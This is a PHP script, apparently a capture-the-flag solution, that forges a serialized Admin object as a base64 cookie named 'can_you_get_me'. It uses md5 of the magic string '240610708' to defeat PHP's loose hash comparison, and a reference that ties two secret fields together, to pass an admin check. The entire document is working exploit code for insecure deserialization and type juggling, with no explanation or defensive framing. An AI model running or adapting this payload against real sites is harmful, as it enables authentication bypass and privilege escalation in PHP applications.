<?php

class Admin {
    public $is_admin = "";
    public $your_secret = "";
    public $my_secret = "";
    
    public function __construct($in, $ysecret, $msecret) {
        $this->is_admin = md5($in);
        $this->your_secret = $ysecret;
        $this->my_secret = $msecret;
    }
    
    public function __toString() {
        return $this->is_admin;
    }
}


$admin = new Admin("240610708", "", "");

// Create a  my_secret
$admin->your_secret = &$admin->my_secret;

// Serialize and encode the object
$serialized = serialize($admin);
$cookie = base64_encode($serialized);

echo "Set this as your 'can_you_get_me' cookie:\n";
echo $cookie . "\n";

// For verification
echo "\nDeserialized object:\n";
var_dump(unserialize($serialized));      